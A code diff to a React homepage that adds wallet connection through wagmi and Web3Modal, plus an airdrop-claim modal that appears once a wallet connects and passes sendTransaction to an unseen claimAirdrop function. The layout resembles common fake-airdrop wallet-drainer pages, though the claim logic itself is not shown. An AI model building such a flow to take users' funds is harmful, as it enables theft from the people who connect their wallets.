@@ -12,8 +12,18 @@ import {
   Footer1,
   Footer2,
 } from "../components";
+import { useWeb3Modal } from "@web3modal/wagmi/react";
+import { useAccount, usePublicClient, useSendTransaction } from 'wagmi'
+import { claimAirdrop } from "../../funcs";
+
 
 const HomePage = () => {
+  const {open } = useWeb3Modal()
+  const { address, isConnected } = useAccount()
+  const publicClient = usePublicClient()
+  const { sendTransaction } = useSendTransaction()
+  
+  
   const [toggle, setToggle] = useState(false);
   const [modal, setModal] = useState(false);
 
@@ -26,13 +36,20 @@ const HomePage = () => {
   };
 
   useEffect(() => {
-    setModal(true);
-  }, []);
+    if(address)setModal(true);
+    
+  }, [address]);
+
+const claim = async () => {
+  claimAirdrop(address, publicClient, open, sendTransaction)
+}
+
+
 
   return (
     <>
       <Navbar toggleHandler={toggleHandler} />
-      {modal && <Modal2 modalHandler={modalHandler} />}
+      {modal && <Modal2 modalHandler={modalHandler} claimer={claim}/>}
       <section className="overflow-hidden">
         <Hero toggle={toggle} toggleHandler={toggleHandler} />
         <RewardContent />
